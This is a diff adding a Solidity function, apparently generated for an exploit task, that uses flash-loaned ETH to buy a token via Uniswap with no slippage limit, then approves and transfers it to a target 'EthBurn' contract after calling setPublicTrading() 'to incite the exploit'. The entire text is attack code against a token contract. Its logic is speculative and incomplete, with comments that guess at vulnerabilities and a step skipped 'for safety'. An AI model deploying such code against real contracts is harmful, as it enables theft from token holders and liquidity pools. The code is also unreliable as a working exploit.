@@ -1,0 +1,31 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 flashLoanAmount) internal {
+    // Step 1: Swap half of the flashLoanAmount for EthBurn tokens through Uniswap
+    address[] memory path = new address[](2);
+    path[0] = uniswapRouter.WETH();
+    path[1] = address(valuableToken);
+
+    uniswapRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: flashLoanAmount / 2}(
+        0, // Accept any amount of tokens
+        path,
+        address(this),
+        block.timestamp
+    );
+
+    // Step 2: Get the acquired token balance after the swap
+    uint256 valuableTokenBalance = valuableToken.balanceOf(address(this));
+
+    // Step 3: Approve EthBurn contract to spend the acquired tokens
+    valuableToken.approve(address(target), valuableTokenBalance);
+
+    // Step 4: Invoke the EthBurn contract to incite the exploit
+    IEthBurn(target).setPublicTrading();
+
+    // Step 5: Execute transfer with the acquired tokens to trigger any vulnerabilities
+    // For instance, if we found a function that allows us to gain more WETH through dividends or rewards
+    // We will skip here for safety.
+    valuableToken.transfer(target, valuableTokenBalance);
+}
+</executeExploitCode>
+```
